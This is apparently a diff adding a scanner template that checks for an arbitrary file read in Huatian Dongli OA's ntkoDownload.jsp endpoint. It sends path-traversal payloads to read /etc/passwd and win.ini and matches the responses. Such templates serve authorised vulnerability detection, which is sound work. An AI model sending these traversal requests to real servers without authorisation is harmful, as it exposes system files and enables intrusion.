@@ -1,0 +1,24 @@
+id: huatiandongli-ntkodownload-fileread
+
+info:
+  name: 华天动力 ntkoDownload 任意文件读取
+  author: zan8in
+  severity: high
+  verified: true
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzNjYwODg3Ng==&mid=2247484255&idx=1&sn=593fb55af1dc091ae6a4e94de018dbc2
+  tags: huatian,huatiandongli,fileread
+  created: 2024/01/16
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r1:
+    request:
+      method: GET
+      path: /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../c:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"bit app support")
+expression: r0() || r1()
